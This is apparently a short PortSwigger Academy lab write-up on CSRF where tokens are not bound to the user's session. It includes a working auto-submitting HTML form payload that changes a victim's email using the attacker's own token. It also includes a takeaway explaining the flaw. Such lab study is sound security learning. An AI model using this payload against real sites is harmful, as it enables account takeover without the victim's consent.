# CSRF Vulnerability


![****](/PortSwigger/Academy/PortSwigger/Labs/CSRF/Screenshots/cssrf4-1.PNG)

![****](/PortSwigger/Academy/PortSwigger/Labs/CSRF/Screenshots/cssrf4-2.PNG)


## Let generate some Payloads!

```php
<form method="POST" action="X.web-security-academy.net/my-account/change-email">
	<input type="text" name="email" value="test@gmail.com">
	<input required type="hidden" name="csrf" value="kDsuUM8eQZirZ12sWwS4BkMtluaPUT2E">
</form>
<script>
	document.forms[0].submit();
</script>
```

## Takeaway

- Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.
- Use your account token and check if any changes can be submitted!